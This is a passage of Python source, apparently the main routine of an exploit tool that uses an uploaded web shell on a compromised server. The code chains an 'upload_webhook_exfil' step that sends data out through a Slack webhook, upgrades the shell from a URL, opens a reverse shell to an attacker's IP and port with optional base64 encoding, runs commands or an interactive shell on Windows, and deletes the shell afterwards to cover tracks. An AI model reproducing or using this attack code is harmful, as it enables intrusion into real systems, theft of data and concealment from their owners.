            log(f"{key.upper()}:\n{value}", "info", logger, args.verbose)
    

    if args.chain:
        chain_args = {}
        if args.chain == "upload_webhook_exfil" and args.webhook_url:
            chain_args["webhook_url"] = args.webhook_url
            chain_args["service"] = "slack"  # Default, could be extended
        
        if args.chain == "shell_upgrade" and args.upgrade_url:
            chain_args["upgrade_url"] = args.upgrade_url
        
        exploit_chain(
            session, 
            shell_url, 
            os_type, 
            args.chain,
            args.verbose,
            logger,
            **chain_args
        )
    

    if args.kill:
        log("Activating kill switch to delete shell...", "info", logger, args.verbose)
        if delete_shell(session, shell_url, os_type, args.verbose, logger):
            log("Shell successfully deleted", "info", logger, args.verbose)
        else:
            log("Failed to delete shell", "error", logger, args.verbose)
        sys.exit(0)
    

    if os_type == "linux":
        trigger_linux_shell(
            session, 
            shell_url, 
            args.reverse_ip, 
            args.reverse_port,
            args.verbose,
            logger,
            args.base64
        )
    else:  
        if args.command:

            output = execute_command(
                session, 
                shell_url, 
                args.command,
                os_type,
                args.verbose,
                logger
            )
            if output:
                print(f"Command output:\n{output}")
        else:

            interactive_windows_shell(session, shell_url, args.verbose, logger)
    

    if args.cleanup:
        log("Attempting to delete uploaded shell...", "info", logger, args.verbose)
        if delete_shell(session, shell_url, os_type, args.verbose, logger):
            log("Cleanup successful", "info", logger, args.verbose)
        else:
            log("Cleanup failed - shell may still be present", "warning", logger, args.verbose)
    
    log("Exploit completed", "info", logger, args.verbose)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Exploit interrupted by user")
        sys.exit(1)
